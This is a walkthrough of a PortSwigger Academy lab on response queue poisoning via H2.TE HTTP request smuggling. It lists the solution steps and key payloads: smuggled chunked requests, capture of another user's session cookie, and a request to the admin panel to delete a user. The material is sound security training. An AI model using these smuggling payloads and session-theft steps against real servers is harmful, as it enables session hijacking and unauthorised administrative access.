# Lab: Response queue poisoning via H2.TE request smuggling

**Official lab:** [https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)

## Lab idea

The lab focuses on response-queue poisoning arising from an HTTP/2 downgrade and ambiguous transfer-encoding handling. It practices evaluating how mismatched request parsing can shift responses between requests and affect privileged endpoints.

## Vulnerability in brief
HTTP request smuggling (often called **HTTP desync**) is a vulnerability class in which components that process a sequence of HTTP requests disagree about where one request ends and the next begins. In a common deployment, a frontend proxy or load balancer forwards multiple user requests over a reused connection to a backend. If the two systems parse an ambiguous request differently, bytes treated as body by one may be read as the start of another request by the other. This can cause an attacker-controlled prefix to interfere with a later request.

## Solution idea
1. Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request using chunked encoding as follows.
2. Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
3. In Burp Repeater, create the following request, which smuggles a complete request to the back-end server.
4. Send the request to poison the response queue.
5. Wait for around 5 seconds, then send the request again to fetch an arbitrary response.
6. Copy the session cookie and use it to send the following request: GET /admin HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Cookie: session=STOLEN-SESSION-COOKIE
7. Send the request repeatedly until you receive a 200 response containing the admin panel.
8. In the response, find the URL for deleting carlos ( /admin/delete?username=carlos ), then update the path in your request accordingly.

## Payloads / key values
- `POST / HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Transfer-Encoding: chunked 0 SMUGGLED`
- `POST /x HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Transfer-Encoding: chunked 0 GET /x HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net`
- `\r\n\r\n`
- `Host`
- `GET /admin HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Cookie: session=STOLEN-SESSION-COOKIE`
- `carlos`
- `/admin/delete?username=carlos`

## Official source
- [PortSwigger Academy: Lab: Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)
